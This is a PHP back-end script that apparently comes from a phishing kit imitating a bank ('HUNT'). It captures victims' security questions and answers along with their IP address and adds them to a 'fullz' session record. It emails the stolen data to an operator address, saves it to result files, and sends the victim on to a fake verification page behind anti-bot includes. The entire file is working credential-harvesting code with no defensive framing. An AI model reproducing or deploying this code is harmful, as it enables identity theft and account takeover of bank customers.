<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include "../autob/bts2.php";
include "../req/config.php";


if(isset($_POST['quest1']) && isset($_POST['quest2']) && isset($_POST['quest3']) && isset($_POST['ans1']) && isset($_POST['ans2']) && isset($_POST['ans3'])){
	///////////////////////// MAIL PART //////////////////////
		$quest1 = $_POST['quest1'];
		$quest2 = $_POST['quest2']; 
		$quest3 = $_POST['quest3'];
		$ans1 = $_POST['ans1'];
		$ans2 = $_POST['ans2'];
		$ans3 = $_POST['ans3']; 
		$PublicIP = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
|--------------- SECURITY Q & A ----------------| 
Q1            : $quest1
Ans1          : $ans1
Q2            : $quest2
Ans2          : $ans2
Q3            : $quest3
Ans3          : $ans3";
		$_SESSION['fullz'].=$Info_LOG; 
		
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' New HUNT Q&A' ;$headers = 'From: HUNTSITE' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			$protocol=array($subject,$Info_LOG,$headers);if (detectprotocol($protocol)){
				mail($to, $subject, $Info_LOG, $headers);}
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
		header("location:verify.php?consent_handled=true&amp;consentResponseUri=%2Fprotocol&amp;p=none");
}
else { header("location:qa.php?sfailed=c3Fauth".md5(rand(100, 999999999))."2da15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol"); };
?>